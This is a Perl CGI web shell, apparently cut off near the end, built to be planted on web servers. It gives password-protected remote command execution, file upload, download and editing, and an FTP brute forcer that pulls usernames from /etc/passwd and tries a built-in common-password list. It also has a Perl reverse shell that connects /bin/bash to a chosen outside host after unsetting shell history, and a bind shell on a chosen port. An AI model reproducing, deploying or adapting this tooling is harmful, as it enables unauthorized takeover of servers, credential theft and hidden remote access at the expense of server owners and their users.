#!/usr/bin/perl -I/usr/local/bandmin

$Version= "CyberSpace Dead Poets #";
$EditPersion="<font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0); color:#ffffff; font-weight:bold;'> ~ </font>";

$Password = "iran";	# Change this. You will need to enter this
				# to login.

$WinNT = 0;			# You need to change the value of this to 1 if
				# you're running this script on a Windows NT
				# machine. If you're running it on Unix, you
				# can leave the value as it is.

$NTCmdSep = "&";		# This character is used to seperate 2 commands
				# in a command line on Windows NT.

$UnixCmdSep = ";";		# This character is used to seperate 2 commands
				# in a command line on Unix.

$CommandTimeoutDuration = 10;	# Time in seconds after commands will be killed
				# Don't set this to a very large value. This is
				# useful for commands that may hang or that
				# take very long to execute, like "find /".
				# This is valid only on Unix servers. It is
				# ignored on NT Servers.

$ShowDynamicOutput = 1;		# If this is 1, then data is sent to the
				# browser as soon as it is output, otherwise
				# it is buffered and send when the command
				# completes. This is useful for commands like
				# ping, so that you can see the output as it
				# is being generated.

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!

$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
$cols= 150;
$rows= 26;
#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;

	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}

	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}

#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodedCurrentDir = $CurrentDir;
	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>~ $Version ~  ~ Edit by  ~  # ~</title>
$HtmlMetaHeader
</head>
<style>
font{
font: 12pt Verdana;
}
tr {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
color: #4ae100;
}
td {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
color: #4ae100;
}

table {
BORDER: dashed 1px #333;
BORDER-COLOR: #AE8300;
BACKGROUND-COLOR: #0c0c0c;
color: #FFF;
}

table.null {
BORDER: dashed 1px black;
BORDER-COLOR: black;
}

input {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
BACKGROUND-COLOR: Black;
font: 11pt Verdana;
color: #ff9900;
}

input.submit {
text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
color: #FFFFFF;
border-color: #009900;
}

code {
border			: dashed 0px #333;
BACKGROUND-COLOR: Black;
font: 12pt bold;
color: while;
}

run {
border			: dashed 0px #333;
font: 12pt bold;
color: #FF00AA;
}

textarea {
BORDER-RIGHT:  #000001 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #000001 1px solid;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}



A:link {
	COLOR: #009900; TEXT-DECORATION: none
}
A:visited {
	COLOR: #009900; TEXT-DECORATION: none
}
A:hover {
	text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0);
	color: #FFFFFF; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}

</style>

<body onLoad="document.f.@_.focus()" bgcolor="#0c0c0c" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<center><code>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
	<td align="center" rowspan=2>
		<b><font size="3">~  $EditPersion ~</font></b>
	</td>
	<td>
		<font face="Verdana" size="2"><b>$Version - Connected to <font color="#ff9900">$ServerName<font></b></font>
	</td>
	<td>Server IP:<font color="#ff9900">$ENV{'SERVER_ADDR'}</font> | Your IP: <font color="#ff9900">$ENV{'REMOTE_ADDR'}</font>
	</td>
</tr>
<tr>
<td colspan="2"><font face="Verdana" size="2">
<a href="$ScriptLocation?a=command">Home</a> | 
<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir">Upload File</a> | 
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir">Download File</a> |
<a href="$ScriptLocation?a=backbind">BackConnect & BindPort</a> |
<a href="$ScriptLocation?a=bruteforcer">Brute Forcer</a> |
<a href="$ScriptLocation?a=logout">Disconnect</a> |
<a target='_blank' href="http://www.rohitab.com/cgiscripts/cgitelnet.html">Help</a>
</font></td>
</tr>
</table>
<font color="#C0C0C0" size="3">
END
}

#------------------------------------------------------------------------------
# Prints the Login Screen
#------------------------------------------------------------------------------
sub PrintLoginScreen
{

	print <<END;
<pre>?<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
</pre>
<font style="font: 15pt Verdana; color: yellow;"># Security Center</font><br><br>
<table align="center" border="1" width="600" >
<tbody><tr>
<td valign="top" background=""><p id="hack" style="margin-left: 3px;">
<font color="#009900"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>
<font color="#009900"> Trying connect to Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">~\$</font> Connected ! </font><br>
<font color="#009900"><font color="#FFF000">$ServerName~</font> Checking Server . . . . . . . . . . . . . . . . . . .</font> <br>
<font color="#009900"><font color="#FFF000">$ServerName~</font> Trying connect to Command . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">$ServerName~</font>\$ Connected to Command! </font><br>
<font color="#009900"><font color="#FFF000">$ServerName~<font color="#F00000">\$</font></font> OK! You can kill it!</font>
</tr>
</tbody></table>
<br>

<script type="text/javascript">
new TypingText(document.getElementById("hack"), 30, function(i){ var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
TypingText.runAll();
</script>
END
}

#------------------------------------------------------------------------------
# Prints the message that informs the user of a failed login
#------------------------------------------------------------------------------
sub PrintLoginFailedMessage
{
	print <<END;
<br>login: #<br>
password:<br>
Login incorrect<br><br>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form for logging in
#------------------------------------------------------------------------------
sub PrintLoginForm
{
	print <<END;
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
login: #<br>
password:<input type="password" name="p">
<input class="submit" type="submit" value="Enter">
</form>
END
}

#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "<br><font color=red>o---[  <font color=#ff9900>Edit by $EditPersion </font>  ]---o</green></font></code></center></body></html>";
}

#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{''}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}

#------------------------------------------------------------------------------
# Prints the screen when the user logs out
#------------------------------------------------------------------------------
sub PrintLogoutScreen
{
	print "Connection closed by foreign host.<br><br>";
}

#------------------------------------------------------------------------------
# Logs out the user and allows the user to login again
#------------------------------------------------------------------------------
sub PerformLogout
{
	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
	&PrintPageHeader("p");
	&PrintLogoutScreen;
	&PrintLoginScreen;
	&PrintLoginForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called to login the user. If the password matches, it
# displays a page that allows the user to run commands. If the password doens't
# match or if no password is entered, it displays a form that allows the user
# to login
#------------------------------------------------------------------------------
sub PerformLogin 
{
	if($LoginPassword eq $Password) # password matched
	{
		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
		&ExecuteCommand;
	}
	else # password didn't match
	{
		&PrintPageHeader("p");
		&PrintLoginScreen;
		if($LoginPassword ne "") # some password was entered
		{
			&PrintLoginFailedMessage;
		}
		&PrintLoginForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to enter commands
#------------------------------------------------------------------------------
sub PrintCommandLineInputForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "<font color='#FFFFFF'>[admin\@$ServerName $CurrentDir]\$</font> ";
	print <<END;
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="command">
<input type="hidden" name="d" value="$CurrentDir">
$Prompt
<input type="text" size="40" name="c">
<input class="submit"type="submit" value="Enter">
</form>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to download files
#------------------------------------------------------------------------------
sub PrintFileDownloadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="download">
$Prompt download<br><br>
Filename: <input class="file" type="text" name="f" size="35"><br><br>
Download: <input class="submit" type="submit" value="Begin">
</form>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to upload files
#------------------------------------------------------------------------------
sub PrintFileUploadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><br>
Filename: <input class="file" type="file" name="f" size="35"><br><br>
Options: &nbsp;<input type="checkbox" name="o" id="up" value="overwrite">
<label for="up">Overwrite if it Exists</label><br><br>
Upload:&nbsp;&nbsp;&nbsp;<input class="submit" type="submit" value="Begin">
<input type="hidden" name="d" value="$CurrentDir">
<input class="submit" type="hidden" name="a" value="upload">
</form>
END
}

#------------------------------------------------------------------------------
# This function is called when the timeout for a command expires. We need to
# terminate the script immediately. This function is valid only on Unix. It is
# never called when the script is running on NT.
#------------------------------------------------------------------------------
sub CommandTimeout
{
	if(!$WinNT)
	{
		alarm(0);
		print <<END;
</textarea>
<br><font color=yellow>
Command exceeded maximum time of $CommandTimeoutDuration second(s).</font>
<br><font size='6' color=red>Killed it!</font>
END
		&PrintPageFooter;
		exit;
	}
}



#------------------------------------------------------------------------------
# This function displays the page that contains a link which allows the user
# to download the specified file. The page also contains a auto-refresh
# feature that starts the download automatically.
# Argument 1: Fully qualified filename of the file to be downloaded
#------------------------------------------------------------------------------
sub PrintDownloadLinkPage
{
	local($FileUrl) = @_;
	if(-e $FileUrl) # if the file exists
	{
		# encode the file link so we can send it to the browser
		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
		&PrintPageHeader("c");
		print <<END;
Sending File $TransferFile...<br>
If the download does not start automatically,
<a href="$DownloadLink">Click Here</a>
END
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}
	else # file doesn't exist
	{
		&PrintPageHeader("f");
		print "Failed to download $FileUrl: $!";
		&PrintFileDownloadForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# This function reads the specified file from the disk and sends it to the
# browser, so that it can be downloaded by the user.
# Argument 1: Fully qualified pathname of the file to be sent.
#------------------------------------------------------------------------------
sub SendFileToBrowser
{
	local($SendFile) = @_;
	if(open(SENDFILE, $SendFile)) # file opened for reading
	{
		if($WinNT)
		{
			binmode(SENDFILE);
			binmode(STDOUT);
		}
		$FileSize = (stat($SendFile))[7];
		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
		print "Content-Type: application/x-unknown\n";
		print "Content-Length: $FileSize\n";
		print "Content-Disposition: attachment; filename=$1\n\n";
		print while(<SENDFILE>);
		close(SENDFILE);
	}
	else # failed to open file
	{
		&PrintPageHeader("f");
		print "Failed to download $SendFile: $!";
		&PrintFileDownloadForm;
		&PrintPageFooter;
	}
}


#------------------------------------------------------------------------------
# This function is called when the user downloads a file. It displays a message
# to the user and provides a link through which the file can be downloaded.
# This function is also called when the user clicks on that link. In this case,
# the file is read and sent to the browser.
#------------------------------------------------------------------------------
sub BeginDownload
{
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# This function is called when the user wants to upload a file. If the
# file is not specified, it displays a form allowing the user to specify a
# file, otherwise it starts the upload process.
#------------------------------------------------------------------------------
sub UploadFile
{
	# if no file is specified, print the upload form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileUploadForm;
		&PrintPageFooter;
		return;
	}
	&PrintPageHeader("c");

	# start the uploading process
	print "Uploading $TransferFile to $CurrentDir...<br>";

	# get the fullly qualified pathname of the file to be created
	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
	$TransferFile =~ m!([^/^\\]*)$!;
	$TargetName .= $PathSep.$1;

	$TargetFileSize = length($in{'filedata'});
	# if the file exists and we are not supposed to overwrite it
	if(-e $TargetName && $Options ne "overwrite")
	{
		print "Failed: Destination file already exists.<br>";
	}
	else # file is not present
	{
		if(open(UPLOADFILE, ">$TargetName"))
		{
			binmode(UPLOADFILE) if $WinNT;
			print UPLOADFILE $in{'filedata'};
			close(UPLOADFILE);
			print "Transfered $TargetFileSize Bytes.<br>";
			print "File Path: $TargetName<br>";
		}
		else
		{
			print "Failed: $!<br>";
		}
	}
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called when the user wants to download a file. If the
# filename is not specified, it displays a form allowing the user to specify a
# file, otherwise it displays a message to the user and provides a link
# through  which the file can be downloaded.
#------------------------------------------------------------------------------
sub DownloadFile
{
	# if no file is specified, print the download form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileDownloadForm;
		&PrintPageFooter;
		return;
	}
	
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}


#------------------------------------------------------------------------------
# This function is called to execute commands. It displays the output of the
# command and allows the user to enter another command. The change directory
# command is handled differently. In this case, the new directory is stored in
# an internal variable and is used each time a command has to be executed. The
# output of the change directory command is not displayed to the users
# therefore error messages cannot be displayed.
#------------------------------------------------------------------------------
sub ExecuteCommand
{
	if($RunCommand =~ m/^\s*cd\s+(.+)/) # it is a change dir command
	{
		# we change the directory internally. The output of the
		# command is not displayed.
		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
		chop($CurrentDir = `$Command`);
		&PrintPageHeader("c");
		&PrintCommandLineInputForm;
		print "Command: <run>$RunCommand </run><br><textarea cols='$cols' rows='$rows' spellcheck='false'>";
		# xuat thong tin khi chuyen den 1 thu muc nao do!
		$RunCommand="dir -oa";
		&RunCmd;
	}elsif($RunCommand =~ m/^\s*gedit\s+(.+)/)
	{
		&PrintPageHeader("c");
		@file = split(/ /, $RunCommand);
		$save='<br><input name="s" type="submit" value="save" class="submit" >';
		$File=$File=$CurrentDir.$PathSep.$file[1];
		if(-w $File)
		{
			$rows="23"
		}else
		{
			$msg="<br><font style='font: 30pt Verdana; color: yellow;' > Permission denied!<font><br>";
			$rows="20"
		}
			$Prompt = $WinNT ? "$CurrentDir> " : "<font color='#FFFFFF'>[admin\@$ServerName $CurrentDir]\$</font> ";
			print <<END;
			<form name="f" method="POST" action="$ScriptLocation">
			<input type="hidden" name="a" value="command">
			<input type="hidden" name="d" value="$CurrentDir">
			$Prompt
			<input type="text" size="40" name="c">
			<input name="s" class="submit" type="submit" value="Enter">
			<br>Command: <run> $RunCommand </run>
			<input type="hidden" name="file" value="$file[1]" > $save <br> $msg
			<br><textarea id="data" name="data" cols="$cols" rows="$rows" spellcheck="false">
END
			$RunCommand = "less $file[1]";
			&RunCmd;
			print "</textarea>";
			print "</form>";
			&PrintPageFooter;
			exit;
	}else
	{
		&PrintPageHeader("c");
		&PrintCommandLineInputForm;
		print "Command: <run>$RunCommand</run><br><textarea id='data' cols='$cols' rows='$rows' spellcheck='false'>";
		&RunCmd;
	}
	print "</textarea>";
	if($RunCommand eq "File saved!")
	{
		print '<script type="text/javascript">document.getElementById("data").innerHTML="File ?? ?c l?u th�nh c�ng!";</script>';
	}
	&PrintPageFooter;
}

#------------------------------------------------------------------------
# run command
#------------------------------------------------------------------------

sub RunCmd
{
	$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
	if(!$WinNT)
	{
		$SIG{'ALRM'} = \&CommandTimeout;
		alarm($CommandTimeoutDuration);
	}
	if($ShowDynamicOutput) # show output as it is generated
	{
		$|=1;
		$Command .= " |";
		open(CommandOutput, $Command);
		while(<CommandOutput>)
		{
			$_ =~ s/(\n|\r\n)$//;
			print "$_\n";
		}
		$|=0;
	}
	else # show output after command completes
	{
		print '$Command';
	}
	if(!$WinNT)
	{
		alarm(0);
	}
}
#==============================================================================
# Form Save File 
#==============================================================================

#==============================================================================
# Save File
#==============================================================================
sub SaveFile
{
	$Data= $in{'data'};
	$File= $in{'file'};
	$File=$CurrentDir.$PathSep.$File;
	open(FILE, ">$File");
	print FILE $Data;
	close FILE;
	$RunCommand= "File saved!";
	&ExecuteCommand;
}
#------------------------------------------------------------------------------
# Brute Forcer Form
#------------------------------------------------------------------------------
sub BruteForcerForm
{
	
	print <<END;

<table >
<tr>
<td colspan="2" align="center">
####################################<br>
FTP brute forcer<br>
www.Black-hg.org<br>
####################################
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="bruteforcer"/>
</td>
</tr>
<tr>
<td>User:<br><textarea rows="18" cols="30" name="user">
END
system("cat /etc/passwd | cut -d: -f1");
print '
</textarea></td>
<td>
Pass:<br>
<textarea rows="18" cols="30" name="pass">123pass
123!@#
123admin
123abc
123456admin
1234554321
12344321
pass123
admin
admincp
administrator
matkhau
passadmin
p@ssword
password
123456
1234567
12345678
123456789
1234567890
111111
000000
222222
333333
444444
555555
666666
777777
888888
999999
123123
234234
345345
456456
567567
678678
789789
123321
456654
654321
7654321
87654321
987654321
0987654321
admin123
admin123456
abcdef
abcabc
!@#!@#
!@#$%^
!@#$%^&*(
!@#$$#@!
abc123
anhyeuem
iloveyou</textarea>
</td>
</tr>
<tr>
<td colspan="2" align="center">
Sleep:<select name="sleep">
<option>0</option>
<option>1</option>
<option>2</option>
<option>3</option>
</select> 
<input type="submit" class="submit" value="Brute Forcer"/></td></tr>
</form>
</table>';
}
#------------------------------------------------------------------------------
# Brute Forcer
#------------------------------------------------------------------------------
sub BruteForcer
{
	$Server=$ENV{'SERVER_ADDR'};
	&PrintPageHeader;
	if($in{'user'} eq "")
	{
		&BruteForcerForm;
	}else
	{
		use Net::FTP; 
		@user= split(/\n/, $in{'user'});
		@pass= split(/\n/, $in{'pass'});
		chomp(@user);
		chomp(@pass);
		print "<br><br>[+] Trying brute $ServerName<br>====================>>>>>>>>>>>><<<<<<<<<<====================<br><br>\n";
		foreach $username (@user)
		{
			if(!($username eq ""))
			{
				foreach $password (@pass)
				{
					$ftp = Net::FTP->new($Server) or die "Could not connect to $ServerName\n"; 
					if($ftp->login("$username","$password"))
					{
						print "<a target='_blank' href='ftp://$username:$password\@$Server'>[+] ftp://$username:$password\@$Server</a><br>\n";
						$ftp->quit();
						break;
					}
					if(!$in{'sleep'} eq "0")
					{
						sleep(int($in{'sleep'}));
					}
					$ftp->quit();
				}
			}
		}
		print "\n<br>==========>>>>>>>>>> Finished <<<<<<<<<<==========<br>\n";
	}
	&PrintPageFooter;
}
#------------------------------------------------------------------------------
# Backconnect Form
#------------------------------------------------------------------------------
sub BackBindForm
{
	$clientIP=$ENV{'REMOTE_ADDR'};
	print <<END;
	<br><br>
	<table>
	<tr>
	<form name="f" method="POST" action="$ScriptLocation">
	<td>BackConnect: <input type="hidden" name="a" value="backbind"></td>
	<td> Host: <input type="text" size="20" name="clientaddr" value="$clientIP">
	 Port: <input type="text" size="7" name="clientport" value="80" onkeyup="document.getElementById('ba').innerHTML=this.value;"></td>
	<td><input name="s" class="submit" type="submit" name="submit" value="Connect"></td>
	</form>
	</tr>
	<tr>
	<td colspan=3><font color=#FFFFFF>[+] Client listen before connect back!
	<br>[+] Try check your Port with <a target="_blank" href="http://www.canyouseeme.org/">http://www.canyouseeme.org/</a>
	<br>[+] Client listen with command: <run>nc -vv -l -p <span id="ba">80</span></run></font></td>
	</tr>
	</table>

	<br><br>
	<table>
	<tr>
	<form name="f" method="POST" action="$ScriptLocation">
	<td>Bind Port: <input type="hidden" name="a" value="backbind"></td>
	<td> Port: <input type="text" size="15" name="clientport" value="1412" onkeyup="document.getElementById('bi').innerHTML=this.value;">
	 Password: <input type="text" size="15" name="bindpass" value="Cheo"></td>
	<td><input name="s" class="submit" type="submit" name="submit" value="Bind"></td>
	</form>
	</tr>
	<tr>
	<td colspan=3><font color=#FFFFFF>[+] Chuc nang chua dc test!
	<br>[+] Try command: <run>sudo nc $ENV{'SERVER_ADDR'} <span id="bi">1412</span></run></font></td>
	</tr>
	</table><br>
END
}
#------------------------------------------------------------------------------
# Backconnect use perl
#------------------------------------------------------------------------------
sub BackBind
{
	use Socket;
	$ClientAddr = $in{'clientaddr'};
	$ClientPort = int($in{'clientport'});
	$proto = getprotobyname('tcp');
	$Shell = "/bin/bash";
	&PrintPageHeader;
	if($ClientPort eq 0)
	{
		&BackBindForm;
		
	}elsif(!$ClientAddr eq "")
	{
		print "[+] Connecting to $ClientAddr\n";
		socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("[-] Unable to Connect !");
		if (!connect(SERVER, pack "SnA4x8", 2, $ClientPort, inet_aton($ClientAddr))) {die("[-] Unable to Connect !");}
		open(STDIN,">&SERVER");
		open(STDOUT,">&SERVER");
		open(STDERR,">&SERVER");
		system("unset HISTFILE; unset SAVEHIST ;echo '[+] Systeminfo: '; uname -a;echo;
		echo '[+] Userinfo: '; id;echo;echo '[+] Directory: '; pwd;echo; echo '[+] Shell: ';$Shell");
		close SERVER;
	}else
	{
		print "[+] Trying to Bind port!";
		socket(S, &PF_INET, &SOCK_STREAM, $proto) || die "[-] Cant create socket\n";
		setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
		bind(S,sockaddr_in($ClientPort,INADDR_ANY)) || die "[-] Cant open port\n";
		listen(S,3) || die "[-] Cant listen port\n";
		while(1)
		{
			accept(CONN,S);
			unless(fork)
			{
				open STDIN,"<&CONN";
				open STDOUT,">&CONN";
				open STDERR,">&CONN";
				exec $Shell || die print CONN "[-] Cant execute $Shell\n";
				close CONN;
				exit 0;
			}
		}
	}
	&PrintPageFooter;
}
#------------------------------------------------------------------------------
# Main Program - Execution Starts Here
#------------------------------------------------------------------------------
&ReadParse;
&GetCookies;

$ScriptLocation = $ENV{'SCRIPT_NAME'};
$ServerName = $ENV{'SERVER_NAME'};
$LoginPassword = $in{'p'};
$RunCommand = $in{'c'};
$TransferFile = $in{'f'};
$Options = $in{'o'};
$Action = $in{'a'};
$Action = "login" if($Action eq ""); # no action specified, use default

#bien dung trong ham EditFile
$Save= $in{'s'};
# get the directory in which the commands will be executed
$CurrentDir = $in{'d'};
# mac dinh xuat thong tin neu ko co lenh nao!
$RunCommand= "ls -lia" if($RunCommand eq "");
chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if($Action eq "login" || !$LoggedIn) # user needs/has to login
{
	&PerformLogin;
}
elsif($Action eq "command") # user wants to run a command
{
	if($Save eq "save")
	{
		&SaveFile;
	}else
	{
